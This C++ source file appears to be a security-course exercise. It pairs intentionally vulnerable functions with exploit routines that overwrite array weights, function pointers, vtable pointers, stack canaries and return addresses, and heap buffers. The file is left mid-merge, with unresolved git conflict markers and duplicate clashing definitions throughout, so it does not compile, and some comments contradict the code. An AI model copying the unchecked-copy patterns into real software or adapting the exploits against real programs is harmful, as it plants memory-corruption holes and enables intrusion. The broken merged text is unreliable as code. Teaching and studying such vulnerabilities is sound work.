#include <iostream>
#include <string>

using namespace std;

<<<<<<< HEAD
void safe() {
   printf("Safe function\n");
}

void unsafe() {
   printf("UNSAFE FUNCTION!!!!\n");
=======
/*************************************
 * ARRAY VULNERABILTY
 * 1. There must be an array and an array index variable
 * 2. The array index variable must be reachable through external input.
 * 3. There must not be bounds checking on the array index variable.
 ****************************************/
int arrayVulnerability(int index, int score)
{
   // Array of assignment scores (each score is out of 100)
   int scores[5] = { 100, 100, 100, 100, 0 };

   // Weighting for each assignment
   // Note: this is the protected asset
   int weights[5] = { 10, 20, 30, 40, 50 };

   // Sanitize our input: no scores > 100 or < 0!
   if (score > 100) {
      score = 100;
   }
   if (score < 0) {
      score = 0;
   }

   scores[index] = score;

   // Do some quick math to get an overall score by multiplying
   // each score by its weight and averaging them.
   int weightedScores = 0;
   int totalWeights = 0;
   for (int i=0; i<5; i++) {
      weightedScores += scores[i] * weights[i];
      totalWeights += weights[i];
   }

   return weightedScores / totalWeights;
}

/**************************************
 * ARRAY WORKING
 * Call arrayVulnerability() in a way that does
 * not yield unexpected behavior
 *************************************/
void arrayWorking()
{
   // Give ourselves a full marks on the last (ungraded) assignment
   int totalScore = arrayVulnerability(4, 100);
   // Our weighted average should be 100
   cout << "Overall score (working, expecting 100):\t\t" << totalScore << endl;

   // Update our last assignment grade to 80
   totalScore = arrayVulnerability(4, 80);
   // This will lower our overall score to 93
   cout << "Overall score (working, expecting 93):\t\t" << totalScore << endl;
}

/**************************************
 * ARRAY EXPLOIT
 * 1. The attacker provides an array index value outside the expected range
 * 2. The attacker must be able to provide input or redirect
 *    existing input into the array at the index he provided
 * 3. The injected value must alter program state in a way
 *    that is desirable to the attacker
 *************************************/
void arrayExploit()
{
   int totalScore = arrayVulnerability(4, 80);
   cout << "Overall score (pre-exploit, expecting 93):\t" << totalScore << endl;

   // At this point, our total score will be 93. Let's bump it by
   // exploiting the array index to change the weight for the final
   // assignment. We use a negative index to write our 'score' into
   // the protected array of weights, changing our grade to 99.
   totalScore = arrayVulnerability(-4, 1);
   cout << "Overall score (post-exploit, expecting 93):\t" << totalScore << endl;
}

void arcSafeFunction() {
   cout << "Safe!" << endl;
}

void arcUnsafeFunction() {
   cout << "UNSAFE!!" << endl;
>>>>>>> b78ba36534cf64f42d6da3798a205bbb6443297d
}

/*************************************
 * ARC VULNERABILTY
 * 1. There must be a function pointer used in the code.
 * 2. Through some vulnerability, there must be a way for user input 
 *    to overwrite the function pointer. This typically happens through 
 *    a stack buffer vulnerability.
 * 3. After the memory is overwritten, the function pointer must 
 *    be dereferenced.
 ****************************************/
<<<<<<< HEAD
// accept a buffer
void arcVulnerability(const char * input)
{
   // set the function ptr to the safe function
   void (* functionPtr)() = safe;
   // set the buffer
   char buffer[4] = {0};

   // create vulnerability from the buffer by not checking the length of the input
   memcpy(buffer, input, strlen(input));
  
   // call the now unsafe pointer
   functionPtr();
=======
void arcVulnerability(const char *input)
{
   // Setup our function pointer to arcSafeFunction()
   void (* pointerToSafe)() = arcSafeFunction;

   // Make a small buffer
   char buffer[4];

   // Note: using memcpy + strlen here is the vulnerability - it will
   // overrun the buffer.
   memcpy(buffer, input, strlen(input));

   // Execute our (hopefully) safe function
   pointerToSafe();
>>>>>>> b78ba36534cf64f42d6da3798a205bbb6443297d
}

/**************************************
 * ARC WORKING
 * Call arcVulnerability() in a way that does
 * not yield unexpected behavior
 *************************************/
void arcWorking()
{
<<<<<<< HEAD
   arcVulnerability("Home");
=======
   cout << "Working: ";
   arcVulnerability("Hi\0\0");
>>>>>>> b78ba36534cf64f42d6da3798a205bbb6443297d
}

/**************************************
 * ARC EXPLOIT
 * ...
 *************************************/
void arcExploit()
{
<<<<<<< HEAD

   // create buffer
   char bad[4 + sizeof(long *)] = {0};

   // create function pointer that points to safe
   bad[0] = 0xaa;
   bad[1] = 0xaa;
   bad[2] = 0xaa;
   bad[3] = 0xaa;

   // overflow the buffer to point to the unsafe function
   void (* unsafePtr)() = unsafe;
   memcpy(bad + 4, (long *)&unsafePtr, sizeof(long *));

   arcVulnerability(bad);
=======
   // Initialize our input with zeros, make it big enough to hold
   // the buffer size + function pointer.
   char maliciousInput[4 + sizeof(long *)] = { 0 };

   // Set our input to something strcpy won't mind (no null character)
   maliciousInput[0] = 0x42;
   maliciousInput[1] = 0x61;
   maliciousInput[2] = 0x64;
   maliciousInput[3] = 0x21;

   // Set the remainder of our input to the address of arcUnsafeFunction()
   void (* pointerToUnsafe)() = arcUnsafeFunction;
   memcpy(maliciousInput + 4, (long *)&pointerToUnsafe, sizeof(long *));

   cout << "Exploit: ";
   arcVulnerability(maliciousInput);
}

// Simple classes to demonstrate vptr / vtable manipulation
class MyClass {
public:
   virtual void sayHi() {
      cout << "Hello!" << endl;
   }
private:
   char buffer[4] = "Hi\0";
};

class MyUnsafeClass: MyClass {
public:
   virtual void sayHi() {
      cout << "UNSAFE!!" << endl;
   }
};

void vtableSayHi(MyClass *myClass) {
   myClass->sayHi();
}

/*************************************
 * VTABLE VULNERABILTY
 * ...
 ****************************************/
void vtableVulnerability(const char *input)
{
   // Overall note: clang on macOS (x86_64) puts the vptr before any
   // class members (like buffer), so there's no way to reproduce the
   // vtable spraying attack as canonized in the reading - at least
   // on this class of machines using this compiler. It is, however,
   // possible to use a stack smashing attack to accomplish the same:
   // change the vptr of a class. This is what is implemented here.

   MyClass myClass = MyClass();
   char buffer[2];

   // Note: using memcpy + strlen here is the vulnerability - it will
   // overrun the buffer. Given the positions in the stack, it allows
   // the caller to potentially overwrite myClass' vptr.
   memcpy(buffer, input, strlen(input));

   // Note: this indirection is necessary because otherwise the vptr
   // (that may be overwritten) is cached.
   vtableSayHi(&myClass);
}

/**************************************
 * VTABLE WORKING
 * Call vtableVulnerability() in a way that does
 * not yield unexpected behavior
 *************************************/
void vtableWorking()
{
   vtableVulnerability("Hi");
}

/**************************************
 * VTABLE EXPLOIT
 * ...
 *************************************/
void vtableExploit()
{
   // Initialize our input with zeros, make it big enough to hold
   // the buffer size + function pointer.
   char maliciousInput[2 + sizeof(long *) + sizeof(long *)] = { 0 };

   // Set our input to something strcpy won't mind (no null character)
   maliciousInput[0] = 0x48;
   maliciousInput[1] = 0x69;

   // Set the remainder of our input to the address of MyUnsafeClass' VTable
   MyUnsafeClass myUnsafeClass = MyUnsafeClass();
   long **myUnsafeClassVTable = (long **)((long *)&myUnsafeClass)[0];
   memcpy(maliciousInput + 2, (long *)&myUnsafeClassVTable, sizeof(long *));
   memcpy(maliciousInput + 2 + sizeof(long *), (long *)&myUnsafeClassVTable, sizeof(long *));

   vtableVulnerability(maliciousInput);
}

/*************************************
 * STACK VULNERABILTY
 * ...
 ****************************************/
void stackVulnerability(const string &str)
{
   char buffer[8] = { 0 };

   // Note: using memcpy + strlen here is the vulnerability - it will
   // overrun the buffer.
   memcpy(buffer, str.c_str(), str.length());
}

/**************************************
 * STACK WORKING
 * Call stackVulnerability() in a way that does
 * not yield unexpected behavior
 *************************************/
void stackWorking()
{
   printf("Stack is");
   char msg[8] = "Hi!\0\0\0\0";
   stackVulnerability(msg);
   printf(" NOT ");
   printf(" smashed!\n");
}

/**************************************
 * STACK EXPLOIT
 * ...
 *************************************/
void stackExploit()
{
   long anchor = 0;
   char exploit[32] = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";

   printf("Stack is");

   // Fetch our canary
   long canary = *((long *)(&anchor + 6));

   // Fetch our frame pointer
   long framePtr = *((long *)(&anchor - 11));

   // Fetch the return address
   long returnAddr = *((long *)(&anchor - 10)); // 2a35
   returnAddr += 145; // 2ac6
   // Note: The following will only work when run under
   // a debugger
   // long returnAddr = 0x100002acb;

   memcpy(exploit + 8, &canary, sizeof(long *));
   memcpy(exploit + 16, &framePtr, sizeof(long *));
   memcpy(exploit + 24, &returnAddr, sizeof(long *));

   string *exploitStr = new string(exploit, 32);
   stackVulnerability(*exploitStr);
   printf(" NOT");
   printf(" smashed!\n");
}

/*************************************
 * HEAP VULNERABILTY
 * ...
 ****************************************/
void heapVulnerability(const string &input)
{
   char *buff1 = (char *)malloc(4);
   char *buff2 = (char *)malloc(4);

   assert(buff1 < buff2);
   memcpy(buff1, input.c_str(), input.length());

   free(buff2);
   free(buff1);

   char *buff3 = (char *)malloc(12);
   strncpy(buff3, "Heap safe!\n", 11);
   printf("%s\n", buff3);
}

/**************************************
 * HEAP WORKING
 * Call heapVulnerability() in a way that does
 * not yield unexpected behavior
 *************************************/
void heapWorking()
{
   heapVulnerability("Working");
}

/**************************************
 * HEAP EXPLOIT
 * ...
 *************************************/
void heapExploit()
{
   char exploit[32] = "aaaaaaaaaaaNOT!";
   string *exploitStr = new string(exploit, 32);
   heapVulnerability(*exploitStr);
}

/*************************************
 * INTEGER OVERFLOW VULNERABILTY
 * ...
 ****************************************/
void intOverflowVulnerability(int octalPerms)
{
   // This is a subtle one. We're incorrectly comparing an int
   // with the least significant 3 binary digits. We're expecting
   // an POSIX file permissions octal-style pattern (i.e. 0755)
   // but going about the check all wrong.
   // For reference: POSIX permissions should be checked
   // bit-by-bit in binary.
   if (octalPerms >= 07) {
      cout << "Access granted" << endl;
      return;
   }

   cout << "Access denied!" << endl;
}

/**************************************
 * INTEGER OVERFLOW WORKING
 * Call intOverflowVulnerability() in a way that does
 * not yield unexpected behavior
 *************************************/
void intOverflowWorking()
{
   cout << "Working: ";
   intOverflowVulnerability(01);
}

/**************************************
 * INTEGER OVERFLOW EXPLOIT
 * ...
 *************************************/
void intOverflowExploit()
{
   cout << "Exploit: ";
   intOverflowVulnerability(100);
>>>>>>> b78ba36534cf64f42d6da3798a205bbb6443297d
}

/*************************************
 * ANSII-UNICODE VULNERABILTY
 * 1. There must be a buffer where the basetype is greater than one.
 * 2. Validation of the buffer must check the size of the buffer rather 
      than the number of elements in the buffer.
 ****************************************/
<<<<<<< HEAD
void ansiiToUnicodeVulnerability(long * input)
{
   // Buffer that is vulnerable
   long buffer[32];
   // Not checking the number of elements and instead checking the size creates the vulnerability
   memcpy(buffer, input, sizeof(buffer) * sizeof(short));
   cout << buffer << endl;
=======
void ansiiToUnicodeVulnerability(short *input)
{
   short buff[32];
   memcpy(buff, input, sizeof(buff) * sizeof(short));
   cout << buff << endl;
>>>>>>> b78ba36534cf64f42d6da3798a205bbb6443297d
}

/**************************************
 * ANSII-UNICODE WORKING
 * Call ansiiToUnicodeVulnerability() in a way that does
 * not yield unexpected behavior
 *************************************/
void ansiiToUnicodeWorking()
{
<<<<<<< HEAD
   long lng[4] = {0xaa, 0xaa, 0xaa, 0xaa};
   ansiiToUnicodeVulnerability(lng);
=======
   short msg[5] = { 0x53, 0x61, 0x66, 0x65, 0x21 };
   ansiiToUnicodeVulnerability(msg);
>>>>>>> b78ba36534cf64f42d6da3798a205bbb6443297d
}

/**************************************
 * ANSII-UNICODE EXPLOIT
 * ...
 *************************************/
void ansiiToUnicodeExploit()
{
<<<<<<< HEAD
   // NOTE: This will cause the program to abort. To see the actual overflow use ASAN
   long bad[64] = {};
   ansiiToUnicodeVulnerability(bad);
=======
   // Note: Running this with ASAN enabled will show the buffer
   // overflow. Running it as-is will abort.
   short msg[64] = {};
   ansiiToUnicodeVulnerability(msg);
>>>>>>> b78ba36534cf64f42d6da3798a205bbb6443297d
}

static const char *SectionBoundary = "********************";

/**********************************************
 * MAIN : The main function.
 **********************************************/
int main()
{
<<<<<<< HEAD
   // cout << "Array Index" << endl;
   // cout << SectionBoundary << endl;

   // arrayVulnerability();
   // arrayWorking();
   // arrayExploit();

   cout << "\nARC" << endl;
   cout << SectionBoundary << endl;

   // arcVulnerability();
   arcWorking();
   arcExploit();

   // cout << "VTABLE" << endl;
   // cout << SectionBoundary << endl;

   // vtableVulnerability();
   // vtableWorking();
   // vtableExploit();

   // cout << "Stack Smashing" << endl;
   // cout << SectionBoundary << endl;

   // stackVulnerability();
   // stackWorking();
   // stackExploit();

   // cout << "Heap Spraying" << endl;
   // cout << SectionBoundary << endl;

   // heapVulnerability();
   // heapWorking();
   // heapExploit();

   // cout << "Integer Overflow" << endl;
   // cout << SectionBoundary << endl;

   // intOverflowVulnerability();
   // intOverflowWorking();
   // intOverflowExploit();

   cout << "\nANSI-UNICODE" << endl;
   cout << SectionBoundary << endl;

   // ansiiToUnicodeVulnerability();
   ansiiToUnicodeWorking();
   ansiiToUnicodeExploit();
=======
   string input;
   cout << "Select exploit: " << endl;
   cout << "\t1: Array Index" << endl;
   cout << "\t2: ARC" << endl;
   cout << "\t3: VTABLE" << endl;
   cout << "\t4: Stack Smashing" << endl;
   cout << "\t5: Heap Spraying" << endl;
   cout << "\t6: Integer Overflow" << endl;
   cout << "\t7: ASCII to Unicode" << endl;
   cout << "> ";
   
   cin >> input;
   int selection = stoi(input);

   switch(selection) {
      case 1:
         cout << "Array Index" << endl;
         cout << SectionBoundary << endl;

         arrayWorking();
         arrayExploit();

         break;
      case 2:
         cout << endl << "ARC" << endl;
         cout << SectionBoundary << endl;

         arcWorking();
         arcExploit();

         break;
      case 3:
         cout << endl << "VTABLE" << endl;
         cout << SectionBoundary << endl;

         vtableWorking();
         vtableExploit();

         break;
      case 4:
         cout << endl << "Stack Smashing" << endl;
         cout << SectionBoundary << endl;

         stackWorking();
         stackExploit();

         break;
      case 5:
         cout << endl << "Heap Spraying" << endl;
         cout << SectionBoundary << endl;

         heapWorking();
         heapExploit();

         break;
      case 6:
         cout << endl << "Integer Overflow" << endl;
         cout << SectionBoundary << endl;

         intOverflowWorking();
         intOverflowExploit();

         break;
      case 7:
         cout << endl << "ASCII to Unicode" << endl;
         cout << SectionBoundary << endl;

         ansiiToUnicodeWorking();
         ansiiToUnicodeExploit();

         break;
      default:
         cout << "Invalid selection";
         exit(-1);
   }
>>>>>>> b78ba36534cf64f42d6da3798a205bbb6443297d

   return 0;
}
